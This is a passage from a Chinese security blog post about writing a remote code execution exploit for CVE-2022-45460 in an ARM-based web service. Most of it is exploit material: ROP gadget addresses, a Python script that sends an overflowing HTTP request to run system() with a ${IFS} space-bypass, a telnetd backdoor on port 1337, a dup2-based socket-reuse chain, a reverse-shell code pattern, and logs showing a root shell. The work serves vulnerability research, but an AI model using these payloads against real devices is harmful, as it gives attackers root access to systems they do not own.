<tbody><tr>
<td>B</td>
<td>简单分支</td>
<td>否</td>
<td>否</td>
</tr>
<tr>
<td>BL</td>
<td>带链接的分支</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>BX</td>
<td>分支并切换指令集</td>
<td>否</td>
<td>是（取决于目标地址）</td>
</tr>
<tr>
<td>BLX</td>
<td>带链接并切换指令集的分支</td>
<td>是</td>
<td>是（取决于目标地址）</td>
</tr>
</tbody></table>
<p>当保存返回地址时，意味着分支或函数调用后下一条指令的地址会被存储在链接寄存器（LR）中。这使得程序在分支或函数调用完成后能够返回到正确的位置。正如我们稍后将看到的，这在函数的序言和尾声中有所体现。在函数的序言中，LR寄存器通常会被压入栈中以保存返回地址，而在尾声中，它会被弹出回PC，以确保程序跳回到调用函数。</p>
<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>接下来谈谈构建ROP链。归根结底，这个过程就是寻找有用的gadgets，并将它们组合起来以实现特定的目标。我的第一次尝试是构建一个执行<code>system(&quot;/bin/sh&quot;)</code>的ROP链。</p>
<p>为了实现这个目标，我需要找到能够将栈指针移动到R0（因为R0是传递第一个参数的寄存器），然后跳转到加载的libc库中的<code>system</code>函数的gadgets。这样，我就可以利用栈来放置我想要执行的命令。</p>
<p>为了找到这些gadgets，广泛使用的Ropper工具非常有用。它专门用于识别和提取二进制文件中的ROP gadgets。</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/02/11/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84CVE-2022-45460%E6%92%9E%E6%B4%9ERCE/image1.png" class="" title="image1">

<p>经过一番搜索，我得到了以下解决方案：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x000175cc</span>: <span class="hljs-keyword">pop</span> &#123;<span class="hljs-built_in">r3</span>, pc&#125;<br><span class="hljs-number">0x000535e8</span>: system<br><span class="hljs-number">0x000368dc</span>: <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">sp</span><span class="hljs-comment">; blx r3</span><br><br></code></pre></td></tr></table></figure>

<p>第一个gadget将R3设置为一个可控的值，并跳转到下一个地址。第二个gadget（<code>mov r0, sp; blx r3</code>）将栈指针移动到R0（<code>system</code>函数的第一个参数），并跳转到R3，而我们之前已经将R3设置为<code>system</code>函数的地址。</p>
<p>函数地址，例如<code>system</code>函数的地址，可以使用<code>readelf -s</code>命令来确定。不过，需要记住的是，我们需要将相应二进制文件或库的基地址添加到输出中看到的偏移量上。这样在构建ROP链时，才能确保使用正确的地址。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ readelf -s libc.so.0 | grep system<br>   659: 0003dfc0    80 FUNC    GLOBAL DEFAULT    7 svcerr_systemerr<br>   853: 000535e8   116 FUNC    WEAK   DEFAULT    7 system<br>   864: 000535e8   116 FUNC    GLOBAL DEFAULT    7 __libc_system<br><br></code></pre></td></tr></table></figure>

<p>正如前面所了解到的，有效载荷中不能包含任何空格。不过，我发现可以使用广为人知的 <code>$&#123;IFS&#125;</code> 策略轻松绕过这一限制 。</p>
<p>把所有内容整合起来，我得到了一个大致如下的漏洞利用代码（完整源代码见文末）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    maps = fetch_maps()<br>    libc, libc_base = parse_maps(maps)<br><br>    payload = <span class="hljs-string">b&quot;&quot;</span><br>    payload += <span class="hljs-number">304</span> * <span class="hljs-string">b&quot;A&quot;</span><br>    payload += pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, libc_base + GADGETS[libc][<span class="hljs-number">0</span>])  <span class="hljs-comment"># pop &#123;r3, pc&#125;</span><br>    payload += pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, libc_base + GADGETS[libc][<span class="hljs-number">1</span>])  <span class="hljs-comment"># system</span><br>    payload += pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, libc_base + GADGETS[libc][<span class="hljs-number">2</span>])  <span class="hljs-comment"># mov r0, sp; blx r3</span><br><br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> sock:<br>        sock.connect((HOST, PORT))<br>        sock.send(<span class="hljs-string">b&quot;GET /&quot;</span> + payload + CMD.replace(<span class="hljs-string">b&quot; &quot;</span>, <span class="hljs-string">b&quot;$&#123;IFS&#125;&quot;</span>) + <span class="hljs-string">b&quot;;.mns.cab HTTP/1.1&quot;</span>)<br>        sock.send(<span class="hljs-string">b&quot;\\r\\n\\r\\n&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(sock.recv(<span class="hljs-number">1024</span>))<br><br></code></pre></td></tr></table></figure>

<p>由于在没有远程交互方式的情况下，使用 <code>/bin/sh</code> 作为命令并没有太大用处，所以我使用 <code>telnetd</code> 在1337端口启动了一个本地Telnet服务器。这样我就可以连接并获取一个Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:~$ python exploit.py 192.168.2.2 80<br>connecting to 192.168.2.2:80<br>libc.so.0 found at 0xf7974000<br>b<span class="hljs-string">&#x27;HTTP/1.0 200 OK\\n&#x27;</span><br>kali@kali:~$ telnet 192.168.2.2 1337<br>Trying 192.168.2.2...<br>Connected to 192.168.2.2.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br><span class="hljs-comment"># echo $USER</span><br>root<br><span class="hljs-comment"># ls</span><br>bin<br><br></code></pre></td></tr></table></figure>

<p>通过 <code>telnetd</code> 实现的简单漏洞利用及Shell获取。</p>
<h2 id="更进一步"><a href="#更进一步" class="headerlink" title="更进一步"></a>更进一步</h2><p>让我们回顾一下，由于缓冲区溢出而能够转移控制流的代码部分。可以看到，在返回语句之前，有两个 <code>fwrite</code> 调用，用于将响应写入到发送原始请求的客户端连接的 <code>socket_stream</code> 中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">write_response_header(socket_stream,<span class="hljs-number">0x68</span>);<br>fwrite(<span class="hljs-string">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 File Not Found&lt;/title&gt;&lt;/head&gt;\\n&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x35</span>,socket_stream);<br>fwrite(<span class="hljs-string">&quot;&lt;body&gt;The requested URL was not found on this server&lt;/body&gt;&lt;/html&gt;\\n&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x43</span>,socket_stream);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure>

<p>这让我产生了以下两个假设：</p>
<ol>
<li>触发ROP链时，连接尚未关闭。</li>
<li><code>socket_stream</code> 的引用很可能仍保存在某个寄存器中。</li>
</ol>
<p>这让我想起了CTF竞赛中的一些挑战，其中存在漏洞的二进制文件通过 <code>socat</code> 等工具在套接字上公开。在这些情况下，构造Shellcode以实现RCE的常见方法如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); <span class="hljs-comment">// 创建套接字</span><br>connect(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;serv_addr, <span class="hljs-number">16</span>); <span class="hljs-comment">// 连接</span><br>dup2(fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// 将套接字文件描述符复制到标准输入（STDIN）</span><br>dup2(fd, <span class="hljs-number">1</span>); <span class="hljs-comment">// 将套接字文件描述符复制到标准输出（STDOUT）</span><br>dup2(fd, <span class="hljs-number">2</span>); <span class="hljs-comment">// 将套接字文件描述符复制到标准错误（STDERR）</span><br>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 执行 /bin/sh</span><br><br></code></pre></td></tr></table></figure>

<p><code>socket()</code> 函数使用指定的域、类型和协议创建一个新的套接字。<code>connect()</code> 函数则用于建立与目标地址的连接。连接建立后，<code>dup2()</code> 函数被调用三次，将套接字文件描述符重定向到标准输入、标准输出和标准错误，有效地将Shell的输入输出绑定到该套接字上。最后，<code>execve()</code> 函数执行 <code>/bin/sh</code>，生成一个通过已建立连接进行通信的Shell。</p>
<p>在上述情况下，我已经完成了这个策略的一半。我已经有了一个套接字&#x2F;连接，所以剩下要做的就是调用 <code>dup2</code> 函数，并调用 <code>system</code> 函数，对吧？这样我就可以将已经建立的连接重新用作Shell。</p>
<p>不过，由于我拥有的是 <code>FILE *stream</code>，而 <code>dup2</code> 需要一个整数类型的文件描述符，所以还需要额外的一步——调用 <code>fileno()</code> 函数来获取相应的文件描述符。因此，这个计划大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">fd = fileno(stream)<br>dup2(fd, <span class="hljs-number">0</span>)<br>dup2(fd, <span class="hljs-number">1</span>)<br>dup2(fd, <span class="hljs-number">2</span>)<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br></code></pre></td></tr></table></figure>

<p>然而，在开始构建ROP链之前，我想先验证一下之前的假设。为此，我在第二次调用 <code>fwrite</code> 之前设置了一个断点，并在返回语句处设置了另一个断点。当命中第一个断点时，<code>socket_stream</code> 的引用应该在R3中（<code>fwrite</code> 的第四个参数）。</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/02/11/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84CVE-2022-45460%E6%92%9E%E6%B4%9ERCE/image2.png" class="" title="image2">

<p>在GDB中，在调用 <code>fwrite</code> 之前打印R3寄存器的值。</p>
<p>在第二个断点处，我们可以看到R3中仍然是相同的值，这证实了在触发ROP链时，我们确实有一个指向 <code>socket_stream</code> 的引用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[#32] Id 31, Name:<span class="hljs-string">&quot;Sofia&quot;</span>, stopped 0xf7fca9fc <span class="hljs-keyword">in</span> pthread_cond_wait (), reason: BREAKPOINT<br>[#33] Id 32, Name: <span class="hljs-string">&quot;Sofia&quot;</span>, stopped 0xf7fca9fc <span class="hljs-keyword">in</span> pthread_cond_wait (), reason: BREAKPOINT<br>[#34] Id 33, Name:<span class="hljs-string">&quot;Sofia&quot;</span>, stopped 0xf7fca9fc <span class="hljs-keyword">in</span> pthread_cond_wait (), reason: BREAKPOINT<br>[#35] Id 34, Name:<span class="hljs-string">&quot;Sofia&quot;</span>, stopped 0xf7fca9fc <span class="hljs-keyword">in</span> pthread_cond_wait(), reason: BREAKPOINT<br>[#36] Id 35, Name:<span class="hljs-string">&quot;Sofia&quot;</span>, stopped 0xf7fca9fc <span class="hljs-keyword">in</span> pthread_cond_wait(), reason: BREAKPOINT<br>[#37] Id 38, Name:<span class="hljs-string">&quot;Sofia&quot;</span>, stopped 0xf7fc7608 <span class="hljs-keyword">in</span>?(), reason: BREAKPOINT<br>[#38] Id 39, Name: <span class="hljs-string">&quot;Sofia&quot;</span>, stopped 0xf7fc7608 <span class="hljs-keyword">in</span>??(), reason: BREAKPOINT<br>trace<br>[#0]<br>[#1] 0x337ea0 →pop &#123;r4, r5, 0xf7e005a4 &gt; fwrite() r6, r7, r8, r9, r10, pc&#125;<br>(remote) gef&gt; p <span class="hljs-variable">$r3</span><br><span class="hljs-variable">$2</span>=0xac88d8<br>(remote) gef&gt;<br><br></code></pre></td></tr></table></figure>

<p>在GDB中，在触发ROP链之前打印R3寄存器的值。</p>
<p>在这个过程中，我还注意到，在程序停止时，我用于触发断点的 <code>curl</code> 命令并没有返回。这意味着连接仍然是打开的。这是个好消息，说明我的假设似乎是成立的。</p>
<p>接下来就是构建ROP链。我继续寻找能够将参数移动到正确寄存器，并按照前面所述调用函数的gadgets。我原本认为每个被调用的函数都会使用 <code>pop &#123;pc&#125;</code> 返回，因此不需要担心gadgets和函数调用的链接问题。但我错了，至少部分错误。</p>
<p>虽然 <code>pop &#123;pc&#125;</code> 的假设是正确的，但我仍然不能简单地链接这些调用。为什么呢？因为我忽略了函数序言。例如，在查看 <code>fileno</code> 函数的汇编序言时可以看到，寄存器R4 - R8被压入栈中。这是为了确保在函数返回时能够恢复这些寄存器（被调用者保存寄存器）。同时，链接寄存器（LR）也被压入栈中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">(remote) gef&gt; disassemble fileno<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> fileno:<br>0×f7e0002c &lt;+0&gt;: push &#123;r4, r5, r6, r7, r8, lr&#125;<br>0xf7e00030 &lt;+4&gt;: ldr r7,[r0,#72] @ 0×48<br>0xf7e00034 &lt;+8&gt;: mov r6, r0<br>0xf7e00038 &lt;+12&gt;: cmp r7,#0<br>0×f7e0003c &lt;+16&gt;: bne 0×f7e000a8 &lt;fileno+124&gt;<br>0×f7e00040 &lt;+20&gt;: bl ø×f7ddaea4 &lt;_aeabi_read_tp@plt&gt;<br>0xf7e00044 &lt;+24&gt;: ldr r8, r0, <span class="hljs-comment">#1168</span><br>0xf7e00048 &lt;+28&gt;: sub r3, [r6, <span class="hljs-comment">#84]@0x54 @0x490</span><br>0×f7e0004c &lt;+32&gt;: cmp r3, r8<br>0×f7e00050 &lt;+36&gt;: beq 0xf7e0009c &lt;fileno+112&gt; @0×4c<br>0×f7e00054 &lt;+40&gt;: add r5,r6,#76 0xf7e0009c &lt;fileno+112&gt; @0×4c<br>0×f7e00058 &lt;+44&gt;: moV r1,#1<br>0xf7e0005c &lt;+48&gt;: mov r2, r5<br><br></code></pre></td></tr></table></figure>

<p>查看 <code>fileno</code> 函数反汇编后的序言。</p>
<p>结合前面讨论的不同跳转指令的知识，这也完全说得通。函数使用 <code>bl</code> 指令进行调用，该指令会将LR设置为跳转后紧随的指令地址。这确保了函数退出时，我们能够返回到正确的位置。</p>
<p>然而，对于我构建ROP链的目标来说，这听起来不是个好消息，因为我无法真正控制LR寄存器。我继续寻找能够在跳转到函数之前设置LR的gadgets。尽管这个解决方案对你来说可能很明显，但我花了一晚上才终于意识到，我们可以直接跳过函数序言。这样我就完全不用担心LR中的值了。所以我只需给每个函数符号加上 <code>+0x4</code>。问题解决了。</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/02/11/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84CVE-2022-45460%E6%92%9E%E6%B4%9ERCE/image3.png" class="" title="image3">

<p>唯一的要求是在栈上添加一些填充，以适应函数尾声的操作。对于 <code>fileno</code> 函数来说，这意味着总共需要5 x 8字节。事实证明，这非常有用，因为这让我可以将这些寄存器设置为任意值。</p>
<p>我继续将各个部分组合起来。按照计划，我首先调用 <code>fileno</code> 函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-string">b&quot;&quot;</span><br>p += p32(libc_base + <span class="hljs-number">0xf964</span>)  <span class="hljs-comment"># mov r0, r3; pop &#123;r4, pc&#125;</span><br>p += <span class="hljs-string">b&quot;XXXX&quot;</span>  <span class="hljs-comment"># r4 padding</span><br>p += p32(libc_base + <span class="hljs-number">0x3102c</span> + <span class="hljs-number">0x4</span>)  <span class="hljs-comment"># fileno</span><br><br></code></pre></td></tr></table></figure>

<p>第一个gadget将套接字引用 <code>socket_stream</code> 移动到R0中，以确保它作为参数传递给 <code>fileno</code> 函数。调用之后，添加一些填充以正确处理函数尾声。<code>ldmia</code> 结构可以看作与前面看到的 <code>pop</code> 类似。寄存器R5稍后会用到，所以我提前将 <code>dup2</code> 函数的地址存储在那里。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fileno epilogue: ldmia sp!,&#123;r4,r5,r6,r7,r8,pc&#125;</span><br>p += <span class="hljs-string">b&quot;XXXX&quot;</span>  <span class="hljs-comment"># r4 padding</span><br>p += p32(libc_base + <span class="hljs-number">0xce5c</span> + <span class="hljs-number">0x4</span>)  <span class="hljs-comment"># r5 -&gt; dup2</span><br>p += <span class="hljs-string">b&quot;XXXX&quot;</span>  <span class="hljs-comment"># r6 padding</span><br>p += <span class="hljs-string">b&quot;XXXX&quot;</span>  <span class="hljs-comment"># r7 padding</span><br>p += <span class="hljs-string">b&quot;XXXX&quot;</span>  <span class="hljs-comment"># r8 padding</span><br><br></code></pre></td></tr></table></figure>

<p>接下来是调用 <code>dup2</code> 函数。为了实现目标，这个函数需要针对标准输入、标准输出和标准错误各调用一次。对于这三次调用，R0始终应该设置为通过 <code>fileno</code> 函数获取的文件描述符，而R1则从0开始，然后是1，最后是2。第一次调用时R1已经被设置为0，所以这次调用无需额外操作。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">p += p32(libc_base + <span class="hljs-number">0xce5c</span> + <span class="hljs-number">0x4</span>)  <span class="hljs-comment"># dup2, r1 = 0</span><br><span class="hljs-comment"># dup2 epilogue: ldmia sp!,&#123;r7,pc&#125;</span><br>p += <span class="hljs-string">b&quot;XXXX&quot;</span>  <span class="hljs-comment"># r7 padding</span><br><br></code></pre></td></tr></table></figure>

<p>对于第二次调用，我找到了一个gadget，它在跳转到我已经存储 <code>dup2</code> 函数地址的R5之前，会将1移动到R1中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">p += p32(libc_base + <span class="hljs-number">0x1cdcc</span>)  <span class="hljs-comment"># mov r1, #1; mov r2, r6; blx r5</span><br><span class="hljs-comment"># dup2 epilogue: ldmia sp!,&#123;r7,pc&#125;</span><br>p += <span class="hljs-string">b&quot;XXXX&quot;</span>  <span class="hljs-comment"># r7</span><br><br></code></pre></td></tr></table></figure>

<p>遗憾的是，我没有找到适合第三次调用的可行gadget。现在，剩下要做的就是复用第一个简单漏洞利用代码中的ROP链来生成一个Shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">p += p32(libc_base + <span class="hljs-number">0x175cc</span>)  <span class="hljs-comment"># pop &#123;r3, pc&#125;;</span><br>p += p32(libc_base + <span class="hljs-number">0x535e8</span>)  <span class="hljs-comment"># system</span><br>p += p32(libc_base + <span class="hljs-number">0x368dc</span>)  <span class="hljs-comment"># mov r0, sp; blx r3</span><br><br></code></pre></td></tr></table></figure>

<p>终于，到了测试的时候。</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/02/11/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84CVE-2022-45460%E6%92%9E%E6%B4%9ERCE/image4.png" class="" title="image4">

<p>通过复用连接实现带Shell的最终漏洞利用。</p>
<p>成功了！这比第一次尝试的方案优雅得多。无需启动telnetd服务器，也无需建立反向Shell！</p>
<p>最终的漏洞利用源代码可以在文末找到。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>正如在文章中提到的，在开发完这个漏洞利用代码后我才发现，这里讨论的漏洞早已被识别并追踪为CVE-2022-45460。也已经存在一个利用栈上Shellcode实现RCE的漏洞利用代码。</p>
<p>公众号回复<code>CVE-2022-45460</code>获取POC</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%8C%96%E6%8E%98/" class="category-chain-item">漏洞分析与挖掘</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" class="print-no-link">#主机安全</a>
      
        <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="print-no-link">#漏洞挖掘</a>
      
        <a href="/tags/ARM/" class="print-no-link">#ARM</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>一次渗透过程中的CVE-2022-45460撞洞RCE</div>
